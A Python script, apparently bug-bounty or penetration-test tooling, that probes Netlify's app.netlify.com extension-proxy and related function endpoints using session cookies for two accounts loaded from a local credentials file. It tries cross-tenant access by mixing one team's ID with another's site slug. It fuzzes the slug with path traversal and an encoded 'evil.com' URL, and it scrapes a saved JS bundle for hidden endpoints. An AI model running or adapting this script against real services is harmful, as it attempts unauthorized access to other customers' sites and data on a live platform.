# -*- coding: utf-8 -*-
"""extension-proxy 家族变异:teamId/slug/siteId 交叉 + Api-Version + 形态挖取"""
import http.client, ssl, gzip, brotli, json, sys, time, re, urllib.parse
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, COOKIE_B, TEAM_A, TEAM_B, SITE_A

SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
ctx = ssl.create_default_context()

def req(path, cookie=COOKIE_A, method='GET', body=None, headers=None, timeout=20):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json'}
    if cookie: h['Cookie'] = cookie
    if headers:
        h.update(headers)
    if body is not None:
        h['Content-Type'] = 'application/json'
        body = body if isinstance(body, bytes) else body.encode()
    t0 = time.time()
    conn.request(method, path, body=body, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw = brotli.decompress(raw)
    elif enc == 'gzip': raw = gzip.decompress(raw)
    dt = time.time() - t0
    st = r.status
    b = raw.decode('utf-8', 'ignore').replace('\n', ' ')[:250]
    conn.close()
    return st, dt, b

def show(label, path, ck=COOKIE_A, hdrs=None):
    st, dt, b = req(path, ck, headers=hdrs)
    print('%-40s %s %5.1fs | %s' % (label, st, dt, b))

print('==== 1. extension-proxy 基线 ====')
show('A team + A site slug', '/.netlify/functions/extension-proxy?teamId=%s&slug=integration-host-site/%s' % (TEAM_A, SITE_A))
show('ANON 同上', '/.netlify/functions/extension-proxy?teamId=%s&slug=integration-host-site/%s' % (TEAM_A, SITE_A), None)
show('无 teamId', '/.netlify/functions/extension-proxy?slug=integration-host-site/%s' % SITE_A)
show('无 slug', '/.netlify/functions/extension-proxy?teamId=%s' % TEAM_A)

print()
print('==== 2. 站点维度越权:自己的 team + 别人的 site slug ====')
show('A team + B site slug', '/.netlify/functions/extension-proxy?teamId=%s&slug=integration-host-site/%s' % (TEAM_A, SITE_B))
show('B team + A site slug', '/.netlify/functions/extension-proxy?teamId=%s&slug=integration-host-site/%s' % (TEAM_B, SITE_A))
show('B team + B site slug', '/.netlify/functions/extension-proxy?teamId=%s&slug=integration-host-site/%s' % (TEAM_B, SITE_B), COOKIE_B)
show('A team + fake site', '/.netlify/functions/extension-proxy?teamId=%s&slug=integration-host-site/%s' % (TEAM_A, '0' * 32))

print()
print('==== 3. slug 格式变异(不存在的扩展形态)====')
for lbl, slug in [
    ('plain word',      'abc'),
    ('npm style',       'npm:@netlify/sdk'),
    ('uuid raw',        SITE_A),
    ('integration-host', 'integration-host'),
    ('integration-host-site/', 'integration-host-site/'),
    ('path traverse',   'integration-host-site/../netlify'),
    ('double slug',     'integration-host-site/%s/integration-host-site/%s' % (SITE_A, SITE_B)),
    ('url encoded',     urllib.parse.quote('https://evil.com/x')),
]:
    show('slug:' + lbl, '/.netlify/functions/extension-proxy?teamId=%s&slug=%s' % (TEAM_A, urllib.parse.quote(slug, safe='')))

print()
print('==== 4. fetch-extension(市场 slug)====')
show('fetch-ext A team', '/.netlify/functions/fetch-extension?slug=netlify-plugin-abc&teamId=%s' % TEAM_A, hdrs={'Api-Version': '2'})
show('fetch-ext anon', '/.netlify/functions/fetch-extension?slug=netlify-plugin-abc&teamId=%s' % TEAM_A, None, {'Api-Version': '2'})

print()
print('==== 5. fetch-extensions 列表(visibility/unlistedSlug)====')
show('list v=public', '/.netlify/functions/fetch-extensions?teamId=%s&visibility=public' % TEAM_A, hdrs={'Api-Version': '2'})
show('list v=installed', '/.netlify/functions/fetch-extensions?teamId=%s&visibility=installed' % TEAM_A, hdrs={'Api-Version': '2'})
show('list no v', '/.netlify/functions/fetch-extensions?teamId=%s' % TEAM_A, hdrs={'Api-Version': '2'})

print()
print('==== 6. manage-extension-proxy 形态挖取(JS)====')
data = open(r'D:\scan\netlify_report\_js\net_app.js', encoding='utf-8', errors='ignore').read()
for m in list(re.finditer('manage-extension-proxy', data))[:3]:
    s = max(0, m.start() - 600)
    e = min(len(data), m.end() + 600)
    print('--- hit ---')
    print(data[s:e].replace('\n', ' ')[:1100])
print('done')
